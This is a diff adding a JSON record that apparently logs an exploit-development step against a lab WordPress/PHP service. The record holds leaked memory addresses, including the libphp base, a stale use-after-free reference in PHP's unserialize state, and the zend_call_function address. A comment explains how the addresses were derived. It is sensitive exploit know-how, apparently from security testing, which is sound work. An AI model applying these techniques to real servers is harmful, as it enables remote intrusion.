@@ -1,0 +1,13 @@
+{
+ "tier": "ASSISTED (lab /proc reads; unauthenticated = A3)",
+ "ts": "2026-10-22T22:55:08.293117+00:00",
+ "service": "wordpress-x86",
+ "sid": "wp2leak36f6ee19076a432093ceabfa",
+ "child_pid": "19",
+ "libphp_bias": 126244083924992,
+ "stale_chunk_base": 126244054106112,
+ "stale_reference": 126244054536192,
+ "zval_ptr_dtor": 126244088673872,
+ "zend_call_function": 126244088620816,
+ "note": "stale_reference = BG(unserialize).data read straight from basic_globals of the child that fired the producer; stale_chunk_base = the dedicated 2MB region of the freed 8216B d-chunk (emalloc_large -> dedicated chunk, NOT the main heap where sprays land; the vendor's main_heap has their stale ref INSIDE it - different allocation class on php 8.5); code addrs = bias + nm offsets of this lane's libphp (derive, never hardcode)."
+}
